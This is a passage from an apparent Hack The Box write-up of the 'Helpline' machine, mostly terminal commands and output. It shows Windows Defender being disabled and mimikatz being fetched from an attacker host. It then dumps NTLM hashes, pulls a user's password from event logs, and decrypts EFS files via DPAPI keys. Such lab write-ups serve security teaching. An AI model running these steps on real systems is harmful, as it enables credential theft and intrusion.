    Certificate thumbprint: FB15 4575 993A 250F E826 DBAC 79EF 26C2 11CB 77B3

  No recovery certificate found.

  Key information cannot be retrieved.

The specified file could not be decrypted.


C:\Users\Administrator\Desktop&amp;gt;cipher /c ../../tolu/Desktop/user.txt
cipher /c ../../tolu/Desktop/user.txt

 Listing C:\Users\tolu\Desktop\
 New files added to this directory will not be encrypted.

E user.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    HELPLINE\tolu [tolu(tolu@HELPLINE)]
    Certificate thumbprint: 91EF 5D08 D1F7 C60A A0E4 CEE7 3E05 0639 A669 2F29 

  No recovery certificate found.

  Key information cannot be retrieved.

The specified file could not be decrypted.


C:\Users\Administrator\Desktop&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;to-decrypt-them-we-need-administrators-password-for-roottxt-and-tolus-password-for-usertxt-first-time-i-solved-this-box-i-got-the-root-flag-first-as-it-was-easier-but-for-the-write-up-ill-do-user-flag-first&quot;&gt;To decrypt them we need &lt;code class=&quot;highlighter-rouge&quot;&gt;Administrator&lt;/code&gt;’s password for &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;tolu&lt;/code&gt;’s password for &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;. First time I solved this box I got the root flag first as it was easier but for the write-up I’ll do user flag first.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;usertxt&quot;&gt;user.txt&lt;/h3&gt;
&lt;h4 id=&quot;since-we-need-passwords-first-thing-i-did-was-to-put-mimikatz-on-the-box-and-dump-the-password-hashes&quot;&gt;Since we need passwords, first thing I did was to put &lt;a href=&quot;https://github.com/gentilkiwi/mimikatz&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mimikatz&lt;/code&gt;&lt;/a&gt; on the box and dump the password hashes.&lt;/h4&gt;
&lt;h4 id=&quot;but-before-that-i-had-to-disable-&quot;&gt;But before that I had to disable :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\Users\Administrator\Desktop&amp;gt; Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableRealtimeMonitoring $true
PS C:\Users\Administrator\Desktop&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\windows\system32\spool\drivers\color&amp;gt; Invoke-WebRequest http://10.10.xx.xx/mimikatz.exe -OutFile mimikatz.exe
Invoke-WebRequest http://10.10.xx.xx/mimikatz.exe -OutFile mimikatz.exe
PS C:\windows\system32\spool\drivers\color&amp;gt; dir
dir


    Directory: C:\windows\system32\spool\drivers\color
    
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/15/2018   8:12 AM           1058 D50.camp
-a----        9/15/2018   8:12 AM           1079 D65.camp
-a----        9/15/2018   8:12 AM            797 Graphics.gmmp
-a----        9/15/2018   8:12 AM            838 MediaSim.gmmp
-a----        8/16/2019   1:24 PM        1006744 mimikatz.exe
-a----        8/16/2019   1:47 PM          38616 nc.exe
-a----        9/15/2018   8:12 AM            786 Photo.gmmp
-a----        9/15/2018   8:12 AM            822 Proofing.gmmp
-a----        9/15/2018   8:12 AM         218103 RSWOP.icm
-a----        9/15/2018   8:12 AM           3144 sRGB Color Space Profile.icm
-a----        9/15/2018   8:12 AM          17155 wscRGB.cdmp
-a----        9/15/2018   8:12 AM           1578 wsRGB.cdmp

PS C:\windows\system32\spool\drivers\color&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz # lsadump::sam
Domain : HELPLINE
SysKey : f684313986dcdab719c2950661809893
Local SID : S-1-5-21-3107372852-1132949149-763516304

SAMKey : 9db624e549009762ee47528b9aa6ed34

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: d5312b245d641b3fae0d07493a022622

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 52a344a6229f7bfa074d3052023f0b41

RID  : 000003e8 (1000)
User : alice
  Hash NTLM: 998a9de69e883618e987080249d20253

RID  : 000003ef (1007)
User : zachary
  Hash NTLM: eef285f4c800bcd1ae1e84c371eeb282

RID  : 000003f1 (1009)
User : leo
  Hash NTLM: 60b05a66232e2eb067b973c889b615dd

RID  : 000003f2 (1010)
User : niels
  Hash NTLM: 35a9de42e66dcdd5d512a796d03aef50

RID  : 000003f3 (1011)
User : tolu
  Hash NTLM: 03e2ec7aa7e82e479be07ecd34f1603b
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-only-crackable-hash-was-zacharys-&quot;&gt;The only crackable hash was &lt;code class=&quot;highlighter-rouge&quot;&gt;zachary&lt;/code&gt;’s :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/helpline/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-what-can-we-do-with-zachary-&quot;&gt;But what can we do with &lt;code class=&quot;highlighter-rouge&quot;&gt;zachary&lt;/code&gt; ?&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\windows\system32\spool\drivers\color&amp;gt; net users zachary
net users zachary
User name                    zachary
Full Name                    zachary
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/21/2018 10:25:34 PM
Password expires             Never
Password changeable          12/21/2018 10:25:34 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/16/2019 1:37:32 PM

Logon hours allowed          All

Local Group Memberships      *Event Log Readers    *Users
Global Group memberships     *None
The command completed successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;zachary-is-a-member-of-a-local-group-called-event-log-readers-maybe-there-is-something-in-the-event-log-i-queried-the-event-log-with-wevtutil-and-saved-the-output-in-a-file-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;zachary&lt;/code&gt; is a member of a local group called &lt;code class=&quot;highlighter-rouge&quot;&gt;Event Log Readers&lt;/code&gt;, maybe there is something in the event log, I queried the event log with &lt;code class=&quot;highlighter-rouge&quot;&gt;wevtutil&lt;/code&gt; and saved the output in a file :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Windows\System32\spool\drivers\color&amp;gt;wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321 &amp;gt; eventlog.txt                                                                        
wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321 &amp;gt; eventlog.txt

C:\Windows\System32\spool\drivers\color&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-output-was-a-very-long-one-so-i-searched-for-interesting-stuff-like-usernames-by-searching--for-tolu-i-got-this-net-use-command-which-had-tolus-password-&quot;&gt;The output was a very long one so I searched for interesting stuff like usernames, by searching  for &lt;code class=&quot;highlighter-rouge&quot;&gt;tolu&lt;/code&gt; I got this &lt;code class=&quot;highlighter-rouge&quot;&gt;net use&lt;/code&gt; command which had &lt;code class=&quot;highlighter-rouge&quot;&gt;tolu's&lt;/code&gt; password :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Windows\System32\spool\drivers\color&amp;gt;type eventlog.txt | findstr tolu                                                                   
type eventlog.txt | findstr tolu                                                                                                           
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                   
        Account Name:           tolu                                                                                   
        Account Name:           tolu                                                                                   
        Account Name:           tolu
    ----------------
     Removed Output
    ----------------
Process Command Line:   &quot;C:\Windows\system32\systeminfo.exe&quot; /S \\helpline /U /USER:tolu /P !zaq1234567890pl!99                                                                                           
        Account Name:           tolu
Logon Account:  tolu
        Account Name:           tolu
        Process Command Line:   &quot;C:\Windows\system32\net.exe&quot; use T: \\helpline\helpdesk_stats /USER:tolu !zaq1234567890pl!99                                                                                     
        Account Name:           tolu
        Account Name:           tolu

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;tolu--zaq1234567890pl99&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tolu : !zaq1234567890pl!99&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;tolu-is-in-the-remote-management-users-local-group-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tolu&lt;/code&gt; is in the &lt;code class=&quot;highlighter-rouge&quot;&gt;Remote Management Users&lt;/code&gt; local group :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Windows\System32\spool\drivers\color&amp;gt;net users tolu
net users tolu
User name                    tolu
Full Name                    tolu
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/28/2018 10:52:52 PM
Password expires             Never
Password changeable          12/28/2018 10:52:52 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/29/2018 10:20:44 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Users                
Global Group memberships     *None                 
The command completed successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-winrms-port-is-open-&quot;&gt;And &lt;code class=&quot;highlighter-rouge&quot;&gt;winrm&lt;/code&gt;’s port is open :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/helpline/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-thought-of-authenticating-as-tolu-to-read-the-flag-i-used-evilwinrm&quot;&gt;So I thought of authenticating as &lt;code class=&quot;highlighter-rouge&quot;&gt;tolu&lt;/code&gt; to read the flag (I used &lt;a href=&quot;https://github.com/Hackplayers/evil-winrm&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;evilwinrm&lt;/code&gt;&lt;/a&gt;)&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/helpline/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-i-still-couldnt-read-the-flag-&quot;&gt;But I still couldn’t read the flag …&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\tolu\Desktop&amp;gt; type user.txt
Access to the path 'C:\Users\tolu\Desktop\user.txt' is denied.
At line:1 char:1
+ type user.txt
+ ~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\tolu\Desktop\user.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-found-this-guide-to-decrypt-efs-files-with-mimikatz-by-following-it-i-was-able-to-decrypt-the-user-flag&quot;&gt;I found this &lt;a href=&quot;https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files&quot;&gt;guide&lt;/a&gt; to decrypt &lt;code class=&quot;highlighter-rouge&quot;&gt;EFS&lt;/code&gt; files with &lt;code class=&quot;highlighter-rouge&quot;&gt;mimikatz&lt;/code&gt;, by following it I was able to decrypt the user flag.&lt;/h4&gt;
&lt;h4 id=&quot;we-need-to-get-the-certificate-and-decrypt-the-masterprivate-keys-details-in-the-guide-mentioned-above-&quot;&gt;We need to get the certificate and decrypt the master/private keys (details in the guide mentioned above) :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz # crypto::system /file:&quot;C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29&quot; /export                                                                               
* File: 'C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29'                                                                                      
[0045/1] BACKED_UP_PROP_ID                                                                     00                                                                                         [0002/1] KEY_PROV_INFO_PROP_ID                                                                 Provider info:                                                                                     Key Container  : e65e6804-f9cd-4a35-b3c9-c3a72a162e4d                                       Provider       : Microsoft Enhanced Cryptographic Provider v1.0                             Provider type  : RSA_FULL (1)                                                               Type           : AT_KEYEXCHANGE (0x00000001)                                                 Flags          : 00000000                                                                   Param (todo)   : 00000000 / 00000000                                                 [0003/1] SHA1_HASH_PROP_ID
  91ef5d08d1f7c60aa0e4cee73e050639a6692f29
[0020/1] cert_file_element
  Data:
308202f9308201e1a0030201020210560e4d2b13840a9f4ef8246c32c1950f300d06092a864886f70d0101050500300f310d300b06035504031304746f6c753020170d3138313232393231323133335a180f32313138313230353231323133335a300f310d3
00b06035504031304746f6c7530820122300d06092a864886f70d01010105000382010f003082010a0282010100b661bbc3191aed3031d754ceee0cef50462a746656b973a74bed822fa31d44b8eb9ce1f165ef9f9691863b18694d0d72ddbb4ed40bc91021ef9ec7dc
977242dbab9d9124e548d7f71bfa191de5d0fd1d23de24a10958c5821adb7b89b350e5c3da17cdffdf828659dd8732f55bc7bd4f7e7c167f3f054520c34a4b280dbe0e86faae45082eeed8422549a49134b398351563c62dab70cfa3bb66d9cf07e749f3c2bc9a554a8
b2bcda9559d3f42b7b1fed755c519f26243756363efd93cae3f71aa813af0757d231a43daae5b3dc4303b330833e2db7cad6af45ab9c2b756c2de5af4f250df1c58e35bdfb3ccbc6c3be0db973faf27314413375d7b1c40dbc3310203010001a34f304d30150603551d
25040e300c060a2b0601040182370a030430290603551d1104223020a01e060a2b060104018237140203a0100c0e746f6c754048454c504c494e450030090603551d1304023000300d06092a864886f70d010105050003820101001054e49d105efb13f699ec26dd8f2
828eff46966b8b3623dafb132b287e4a4c870261bb6bec2acf8a8a648aead2b8c9daeb366d6096889ea23cba08d71b78aa9c09e92218c6bbd5b17e67910c551f0f452963d730f5b90c6be10048c1234087bcd1cdcc0f17adae55452f7f0b495414f54de59ff39f513e8
1aae5c1aa6e54beb8561aa5795cb59dddbfe528b9020d1f4d1aab1842eafbc0c0d92c75aa42ab1dd278262676a2fd5a39b526544d37cf59c2647db5efb743c78fb744be0cf41b2512c7f42dbb2949cbe359aca36b17670247b49b12c27119f7d358ca38e70c3ccebd13
c5bccc7236ae09646af07077233b49a5615cb8be05b642e09de595c89dfb9
  Saved to file: 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der


mimikatz # dpapi::capi /in:&quot;C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85&quot;

**KEY (capi)**

  dwVersion          : 00000002 - 2
  dwUniqueNameLen    : 00000025 - 37
  dwSiPublicKeyLen   : 00000000 - 0
  dwSiPrivateKeyLen  : 00000000 - 0
  dwExPublicKeyLen   : 0000011c - 284
  dwExPrivateKeyLen  : 00000650 - 1616
  dwHashLen          : 00000014 - 20
  dwSiExportFlagLen  : 00000000 - 0
  dwExExportFlagLen  : 000000fc - 252
  pUniqueName        : e65e6804-f9cd-4a35-b3c9-c3a72a162e4d
  pHash              : 0000000000000000000000000000000000000000
  pSiPublicKey       :
  pSiPrivateKey      :
  pSiExportFlag      :
  pExPublicKey       : 525341310801000000080000ff0000000100010031c3db401c7b5d3713443127af3f97dbe03b6cbcccb3df5be3581cdf50f2f45adec256b7c2b95af46aad7cdbe23308333b30c43d5baeda431a237d75f03a81aa713fae3cd9ef63637543
62f219c555d7feb1b7423f9d55a9cd2b8b4a559abcc2f349e707cfd966bba3cf70ab2dc663153598b33491a4492542d8ee2e0845aefa860ebe0d284b4ac32045053f7f167c7e4fbdc75bf53287dd598682dfffcd17dac3e550b3897bdb1a82c55809a124de231dfdd0e
51d19fa1bf7d748e524919dabdb427297dcc79eef2110c90bd44ebbdd720d4d69183b8691969fef65f1e19cebb8441da32f82ed4ba773b95666742a4650ef0ceece54d73130ed1a19c3bb61b60000000000000000                                         
  pExPrivateKey      :
  **BLOB**
    dwVersion          : 00000001 - 1
    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    dwMasterKeyVersion : 00000001 - 1
    guidMasterKey      : {2f452fc5-c6d2-4706-a4f7-1cd6b891c017}
    dwFlags            : 00000000 - 0 ()
    dwDescriptionLen   : 0000002c - 44
    szDescription      : CryptoAPI Private Key
    algCrypt           : 00006610 - 26128 (CALG_AES_256)
    dwAlgCryptLen      : 00000100 - 256
    dwSaltLen          : 00000020 - 32
    pbSalt             : d05086dc4a0e8c37b26b9298d6e507a07e6b01495c8e874636d6555909860bfc
    dwHmacKeyLen       : 00000000 - 0
    pbHmackKey         :
    algHash            : 0000800e - 32782 (CALG_SHA_512)
    dwAlgHashLen       : 00000200 - 512
    dwHmac2KeyLen      : 00000020 - 32
    pbHmack2Key        : b7a581f4205455a35c32cf2bae9d3be3fd90990ae6f63c417e9c5a06084d04f1
    dwDataLen          : 00000550 - 1360
    pbData             : 0dd1b5843b4e6da999ab982ff7bef727bd63f11eb222fd81420d24e0dc8a8c03910ddca26dba324e943a5357776530618f14c74382062047acb3f35debdb8f885a283c3644542dde4aa1175ac9d7a23e014bb92d85c2f51dd8eb6d0007
a2f4ca83df25b59f32794c2a4e227e526cd2d5f4a222ca9c14be15e62982107d91865a3e0fc04708144aa7fe7f7baf0c5a7b99c18f96e82c1f01dc8b41df64b51befd3a978a9d47a72246ceadfda631d09be350a4d3bf1301fba7e1b6c6e0c40bf95ce9e154f79cbef2
6d7a3c00d538e490132954d4ee94619dcdaf75e64676c89e89317d4668fe4b942a7bc21371efa3adf08152dabdf0d16e608cda6bdcca193771d736e19505e51f6e972ef5da070b0023e740dd96893d0458da1994f72aa3bc6846218e4634d4a199f698dcce5d2a96c68
8bb20d8138ac743fbff1a43934bbdcff40145ebc815edaf5080d63656236aba75261d7fe0b915e393912d8fe731bb4ab232f88553918c17d95f81605fb24bb9a7527e2eda01fc088e653ce99d58143a74595d47169cf58a2308e128e3956c0c4e225b1dfa0cd8cf0307
b670977c3b62b30bd09846e993779c4471cbd0682dc9bf038bfb8daf8286c0fd4fbcdcf135cb48dc38f0d34342a0116aef4211104657c20db578d9b21b2dbe2505bccc86a48b343f0f9df63482562f86f4015e6dc327a209684049188251506a8f39ae8946a9cdec43$
bb71e7d4fac63f33932dd0bd52fa5ffd48ff11c415e856a496252378fb19c456c3e191a19621c292654af48228906eac7ae5717a77a2c616e194ea9189e77cfa0252da0180fe128fa9f3a0cd826f7530dc03428e6ecbbc7ae7bffe0ce2780b3ba686c3d73f3da55af6$
65fec2c22cbb119a698c5bbbed802d3a31fb44e395606adb58e0b0e2030910281dbeeb76bddebf2ae6862633f839324cb72a9c05a7d24acc3cdad9648be0e816039581d4eb3ddefdc1457d3175b5c776ca445bd409038b6369fa9151f6ee88ab44e9d64b40ecd09e89$
7e2b36e51c44f93bc5a985c13cc0f8d31aad776167b027c28a09943580d848af506c68a400ed93734dbe579a84837a90c6fd60d338e9e981599086da725d7e6c87f89f9a59979672a8b74c704e848fc6cac786e49a3b7f310b2839d67652a9ae3018ce6aca06f6e60b$
bcf526f859a618b32b7b112088eefccf69e873e1d62a20b416203a2428d08abe22518eecfe0a5115a82efb21d467854444b15db49e82c4442aaa045fdf4ea725295da78d14082c9140b6ea6356039b48e53fb7eb8d3ea21713c346d6ff381aaf709c5e83e7d0c5e330$
f7374caccf6312f8f36afc041fcfd89a7e93d453393c991c3887d6b98179cc254172dfd4a09c968a25dab0b53df6f38c6b22e9352d0920789920659b1cb55c61f74bccb63fc397e0997f896e55efbaf200629dd399584f1675ebe588b025ee4160387aa3a5a3239899$
75a97eddbf5dc1dbf4defb894091c851f73413e2da6d7a39e23481dcda7857311a2816d720c0da057952e2d4218b2f4f735469cc4d15324de94b7036fb072afdb708929363934351feecc27c0c81206cafaa7bd5748456799cb528773cafc4b6f6fa25c6bc617b537ac
b354b10ddeb628974ad787f792a9b2564741b1ca8538de0647ab945e25aec233b247ca228111bcdafeed17f032d7277507934895b07197e8331451cd9eff35681afc625741ff13ee1daac61e16bea787ad2b3901a52d29c75c33a31d7993ed92a70d2196109d59b817f
e6471f24540f59c95d082556d05333201a4f54c71db4d135308c5339ecf8c63258a73e71d86b7ec0f3d71b8103de2d4b886b51f9994eb2f8a62c9bb444f8e1c19096085d4a67a9a16a9b74bb2d74c0298e499260dcdedd2d1cf94ed1f2e2bf1c4a194f79a3ff1bfb17c
6a
    dwSignLen          : 00000040 - 64
    pbSign             : b3854af7c1faaa30806aa909e65813225a9aede7b0705c4c186d080ced4883b22e9a06acfb1d7762b1c69e368dcecd0de3a7e8b8f112e61cd9231ad5c5eef596                                                         

  pExExportFlag      :
  **BLOB**
    dwVersion          : 00000001 - 1
    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    dwMasterKeyVersion : 00000001 - 1
    guidMasterKey      : {2f452fc5-c6d2-4706-a4f7-1cd6b891c017}
    dwFlags            : 00000000 - 0 ()
    dwDescriptionLen   : 00000018 - 24
    szDescription      : Export Flag
    algCrypt           : 00006610 - 26128 (CALG_AES_256)
    dwAlgCryptLen      : 00000100 - 256
    dwSaltLen          : 00000020 - 32
    pbSalt             : 61af1a324f58c63a6bb3767357892b8c95d9a9a0dea6da062322afc39734c72a
    dwHmacKeyLen       : 00000000 - 0
    pbHmackKey         :
    algHash            : 0000800e - 32782 (CALG_SHA_512)
    dwAlgHashLen       : 00000200 - 512
    dwHmac2KeyLen      : 00000020 - 32
    pbHmack2Key        : ee6cef3310951fa86aba9b0bc3b23c237d23fbac008175bf670b68b73899e983
    dwDataLen          : 00000010 - 16
    pbData             : 3766e1ec88316997e9aeb13d847c396e
    dwSignLen          : 00000040 - 64
    pbSign             : 1d17141018652ad326ebd1a9c3030feb1356fede8002391d9fbba2d5c75221e654aef732841a04638f5577b59e63c8037ed26c7e4f6d1ed34a6244c33e631800                                                         


mimikatz # dpapi::masterkey /in:&quot;C:\Users\tolu\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011\2f452fc5-c6d2-4706-a4f7-1cd6b891c017&quot; /password:!zaq1234567890pl!99                
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {2f452fc5-c6d2-4706-a4f7-1cd6b891c017}
  dwFlags            : 00000005 - 5
  dwMasterKeyLen     : 000000b0 - 176
  dwBackupKeyLen     : 00000090 - 144
  dwCredHistLen      : 00000014 - 20
  dwDomainKeyLen     : 00000000 - 0
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 80ba00dd649b0237d847b3c30d155a36
    rounds           : 00001f40 - 8000
    algHash          : 0000800e - 32782 (CALG_SHA_512)
    algCrypt         : 00006610 - 26128 (CALG_AES_256)
    pbKey            : 9dd4c16fe8fc2375858f5fdc643770d26bd55c48fec169c28d901820ebe28ea0d6845d2867e3a2bb3b763108da7fb69b5203d8a73ffb22b44d21949150546a0387e2a7d05a18b877f06d0dfe8baf89fc4029070bd5f0a5ac9cbe2379dda7facf6a2455ed8dae4dacd51b981b147ebddf12da71d4b22d675925ed576d92247aac8a39eb5080607382ecf2c3e9ea92ce2f

[backupkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : bce3d5c5463ff84017a1f9eabfb4b9ea
    rounds           : 00001f40 - 8000
    algHash          : 0000800e - 32782 (CALG_SHA_512)
    algCrypt         : 00006610 - 26128 (CALG_AES_256)
    pbKey            : 6d4e0478c22d0a52f7bc66249a0c6a7071991300dd122c4bee0aa31b72273938f336a44d08a15a2effcb2e5787069ab153e666dcd518b7af23e168577f56739f68c42e057508d7d5ffb16bf18d9e720873e644152d461d83356f500f4b8efbbcc9ee073a718134111f8b2708bf0f1645

[credhist]
  **CREDHIST INFO**
    dwVersion        : 00000003 - 3
    guid             : {0cc50e66-d2f0-43dc-97a5-5edac908aef9}


Auto SID from path seems to be: S-1-5-21-3107372852-1132949149-763516304-1011

[masterkey] with password: !zaq1234567890pl!99 (normal user)
  key : 1d0cea3fd8c42574c1a286e3938e6038d3ed370969317fb413b339f8699dcbf7f563b42b72ef45b394c61f73cc90c62076ea847f4c1e1fee3947f381d56d0f02                                                                          
  sha1: 8ece5985210c26ecf3dd9c53a38fc58478100ccb

mimikatz # dpapi::capi /in:&quot;C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85&quot; /masterkey:8ece5985210c26ecf3dd9c53a38fc58478100ccb            
**KEY (capi)**
  dwVersion          : 00000002 - 2
  dwUniqueNameLen    : 00000025 - 37
  dwSiPublicKeyLen   : 00000000 - 0
  dwSiPrivateKeyLen  : 00000000 - 0
  dwExPublicKeyLen   : 0000011c - 284
  dwExPrivateKeyLen  : 00000650 - 1616
  dwHashLen          : 00000014 - 20
  dwSiExportFlagLen  : 00000000 - 0
  dwExExportFlagLen  : 000000fc - 252
  pUniqueName        : e65e6804-f9cd-4a35-b3c9-c3a72a162e4d
  pHash              : 0000000000000000000000000000000000000000     
  pSiPublicKey       :    
  pSiPrivateKey      :    
  pSiExportFlag      :                        
  pExPublicKey       : 525341310801000000080000ff0000000100010031c3db401c7b5d3713443127af3f97dbe03b6cbcccb3df5be3581cdf50f2f45adec256b7c2b95af46aad7cdbe23308333b30c43d5baeda431a237d75f03a81aa713fae3cd9ef63637543
62f219c555d7feb1b7423f9d55a9cd2b8b4a559abcc2f349e707cfd966bba3cf70ab2dc663153598b33491a4492542d8ee2e0845aefa860ebe0d284b4ac32045053f7f167c7e4fbdc75bf53287dd598682dfffcd17dac3e550b3897bdb1a82c55809a124de231dfdd0e
51d19fa1bf7d748e524919dabdb427297dcc79eef2110c90bd44ebbdd720d4d69183b8691969fef65f1e19cebb8441da32f82ed4ba773b95666742a4650ef0ceece54d73130ed1a19c3bb61b60000000000000000                                          
  pExPrivateKey      :
  
  **BLOB**
    dwVersion          : 00000001 - 1
    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    dwMasterKeyVersion : 00000001 - 1
    guidMasterKey      : {2f452fc5-c6d2-4706-a4f7-1cd6b891c017}
    dwFlags            : 00000000 - 0 ()
    dwDescriptionLen   : 0000002c - 44
    szDescription      : CryptoAPI Private Key
    algCrypt           : 00006610 - 26128 (CALG_AES_256)
    dwAlgCryptLen      : 00000100 - 256
    dwSaltLen          : 00000020 - 32
    pbSalt             : d05086dc4a0e8c37b26b9298d6e507a07e6b01495c8e874636d6555909860bfc
    dwHmacKeyLen       : 00000000 - 0
    pbHmackKey         :
    algHash            : 0000800e - 32782 (CALG_SHA_512)
    dwAlgHashLen       : 00000200 - 512
    dwHmac2KeyLen      : 00000020 - 32
    pbHmack2Key        : b7a581f4205455a35c32cf2bae9d3be3fd90990ae6f63c417e9c5a06084d04f1
    dwDataLen          : 00000550 - 1360
    pbData             : 0dd1b5843b4e6da999ab982ff7bef727bd63f11eb222fd81420d24e0dc8a8c03910ddca26dba324e943a5357776530618f14c74382062047acb3f35debdb8f885a283c3644542dde4aa1175ac9d7a23e014bb92d85c2f51dd8eb6d0007
a2f4ca83df25b59f32794c2a4e227e526cd2d5f4a222ca9c14be15e62982107d91865a3e0fc04708144aa7fe7f7baf0c5a7b99c18f96e82c1f01dc8b41df64b51befd3a978a9d47a72246ceadfda631d09be350a4d3bf1301fba7e1b6c6e0c40bf95ce9e154f79cbef2
6d7a3c00d538e490132954d4ee94619dcdaf75e64676c89e89317d4668fe4b942a7bc21371efa3adf08152dabdf0d16e608cda6bdcca193771d736e19505e51f6e972ef5da070b0023e740dd96893d0458da1994f72aa3bc6846218e4634d4a199f698dcce5d2a96c68
